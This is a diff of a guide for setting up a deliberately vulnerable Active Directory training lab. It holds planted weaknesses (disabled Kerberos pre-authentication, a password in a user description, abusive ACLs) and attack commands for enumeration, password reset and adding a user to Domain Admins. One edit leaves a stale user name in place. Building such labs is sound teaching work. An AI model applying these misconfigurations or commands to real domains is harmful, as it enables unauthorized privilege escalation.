@@ -1,5 +1,12 @@
 # Windows Lab
 
+## Appliances
+- DC (Windows Server 2022)
+- DM (Windows Server 2022)
+- Attacker (Ubuntu 22.04)
+- NAT
+- Switch
+
 ## DC
 
 ### Configure the IP addresses and domain name
@@ -42,10 +49,11 @@ Make sure that the time zone, the date, and the time are correctly set. The time
 To configure one user, in the Server Manager click *Tools* → *Active Directory Users and Computers* → *Action* → *New* → *User*. Then, enter the user credentials. Uncheck the option *User must change password at next logon*. You must create four users with different characteristics, as indicated in Table 1.
 
 
-User angela.moss must be configured with the pre-authentication disabled. To do that access the user Properties (e.g., double-click over the username in the Active Directory Users and Computers window) and in the Account tab → Account options box check Do not require Kerberos preauthentication.
-User leslie.romero must be configured with a password in the description. In the General tab → Description box write DELETE THIS LATER! Password: RGFyayBBcm15.
-The account of darlene.alderson must have an associated SPN. To perform this configuration, click Tools → ADSI Edit → Action → Connect. Then in DC=polaris,DC=local → CN=Users search for CN=darlene alderson. Right-click on this CN, select Properties and in the Attribute Editor tab search for servicePrincipalName. Select the attribute, click Edit and insert http/polaris.local:80 in the Value to add box. 
-Also, add a constrained Delegation through the Active Directory Users and Computers tab for the cifs service.
+1. User **jesse.pinkman** must be configured with the pre-authentication disabled. To do that access the user *Properties* (e.g., double-click over the username in the *Active Directory Users and Computers* window) and in the Account tab → Account options box check *Do not require Kerberos preauthentication*.
+2. User **saul.goodman** must be configured with a password in the description. In the *General* tab → *Description* box write **DELETE THIS LATER. Password: beTTer@caLL@me**.
+3. The account of **walter.white** must have an associated SPN. To perform this configuration, click *Tools* → *ADSI Edit* → *Action* → *Connect*. Then in *DC=polaris,DC=local → CN=Users* search for *CN=darlene alderson*. Right-click on this *CN*, select *Properties* and in the *Attribute Editor* tab search for *servicePrincipalName*. Select the attribute, click *Edit* and insert **http/polaris.local:80** in the *Value* to add box. 
+Also, add a constrained Delegation through the *Active Directory Users and Computers* tab for the cifs service.
+4. Add two more regular users (**skyler.white** and **hank.schrader**) with no vulnerabilities configured.
 
 ### Disable SMB Signing
 (Only required for the SMB relay attack) 
@@ -155,7 +163,7 @@ ldapsearch -H ldap://192.168.122.10 -D 'jesse.pinkman@polaris.local' -w Wang0Tan
 
 3. Query to list all kerberoastable users:
 ```bash
-ldapsearch -H ldap://192.168.122.10 -D 'leon@polaris.local' -w Password123 -b
+ldapsearch -H ldap://192.168.122.10 -D 'jesse.pinkman@polaris.local' -w Wang0Tang0! -b
 'DC=polaris,DC=local'
 '(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1
 .2.840.113556.1.4.803:=2)))'
@@ -272,10 +280,10 @@ Function SetAcl($for, $to, $right, $inheritance)
     $objAcl.AddAccessRule($ace)
     Set-Acl -AclObject $objAcl -path $objOU
 }
-# Add a 'Generic All' ACE to Tyrell Wellick on AdminSDHolder object.
+# Add a 'Generic All' ACE to hank.schrader on AdminSDHolder object.
 SetAcl (Get-ADUser "hank.schrader") (Get-ADObject 'CN=AdminSDHolder,CN=system,DC=polaris,DC=local') "GenericAll" "None"
 
-# Add a FoceChangePassword (ExtendedRight) ACE to Elliot Alderson on Tyrell Wellick
+# Add a FoceChangePassword (ExtendedRight) ACE to walter.white on hank.schrader
 SetAclExtended (Get-ADUser "walter.white") (Get-ADUser "hank.schrader") "ExtendedRight" "00299570-246d-11d0-a768-00aa006e0529" "None"
 
 ```
@@ -288,10 +296,10 @@ sudo apt-get install samba
 ```
 2. Exploit ACLs
 ```bash
-# Reset Tyrell Wellick password
+# Reset hank.schrader password
 net rpc password hank.schrader -U polaris.local/walter.white -S 192.168.122.10
 
-# Add Eliot Alderson to the Domain Admin group
+# Add walter.white to the Domain Admin group
 net rpc group addmem "Domain Admins" "walter.white" -U polaris.local/hank.schrader%sHyangja@10 -S 192.168.122.10
 ```
 
@@ -314,7 +322,7 @@ Set-GPRegistryValue -Name "Wallpaper Policy" -key "HKEY_CURRENT_USER\Control Pan
 
 Set-GPRegistryValue -Name "Wallpaper Policy" -Key "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\CurrentVersion\WinLogon" -ValueName SyncForegroundPolicy -Type DWORD -Value 1
 
-# Allow tyrell.wellick to Edit Settings of the GPO
+# Allow hank.schrader to Edit Settings of the GPO
 # https://learn.microsoft.com/en-us/powershell/module/grouppolicy/set-gppermission?view=windowsserver2022-ps
 Set-GPPermissions -Name "Wallpaper Policy" -PermissionLevel GpoEditDeleteModifySecurity -TargetName "hank.schrader" -TargetType "User"
 ```
